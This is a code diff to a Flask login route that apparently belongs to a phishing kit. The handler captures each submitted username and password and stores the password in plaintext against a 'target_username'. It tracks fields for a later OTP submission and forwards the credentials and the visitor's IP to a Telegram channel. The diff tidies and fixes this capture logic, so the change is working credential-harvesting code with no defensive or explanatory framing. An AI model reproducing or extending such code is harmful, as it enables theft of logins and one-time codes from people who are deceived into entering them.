@@ -76,39 +76,43 @@ def index():
 
 @app.route("/login", methods=["POST"])
 def do_login():
-    user = request.form.get("username")
-    pw = request.form.get("password")
+    user = request.form.get("username", "").strip()
+    pw = request.form.get("password", "")
     ip = get_client_ip()
-    
-    sessions_db[uid] = {
-        "status": "credentials_submitted",
-        "redirect_url": None,
-        "username": username,
-        "ip": ip,
-        "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-        "otp_submitted": False,
-        "otp_time": None,
-        "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-    }
 
     if "uid" not in session:
         session["uid"] = str(uuid.uuid4())
-    
+
     uid = session["uid"]
-    sessions_db[uid] = {"status": "waiting", "redirect_url": None}
-    
+
+    session["target_username"] = user
+
+    sessions_db[uid] = {
+    "status": "credentials_submitted",
+    "redirect_url": None,
+    "username": user,
+    "ip": ip,
+    "password": pw,
+    "uid": uid,
+    "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+    "otp_submitted": False,
+    "otp_time": None,
+    "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+}
+
     log = (
-    f"<b>🔐 LOGIN ALERT</b>\n"
-    f"━━━━━━━━━━━━━━━━━━\n"
-    f"<b>User:</b> <code>{user}</code>\n"
-    f"<b>Password:</b> <code>{pw}</code>\n"
-    f"━━━━━━━━━━━━━━━━━━\n"
-    f"<b>Session:</b> <code>{uid}</code>\n"
-    f"<b>IP:</b> <code>{ip}</code>\n"
-    f"<b>Time:</b> <code>{datetime.now().strftime('%H:%M:%S')}</code>"
-)
+        f"<b>🔐 LOGIN ALERT</b>\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"<b>User:</b> <code>{user}</code>\n"
+        f"<b>Password:</b> <code>{pw}</code>\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"<b>Session:</b> <code>{uid}</code>\n"
+        f"<b>IP:</b> <code>{ip}</code>\n"
+        f"<b>Time:</b> <code>{datetime.now().strftime('%H:%M:%S')}</code>"
+    )
+
     send_telegram(log)
-    
+
     return jsonify({"status": "ok"})
 
 
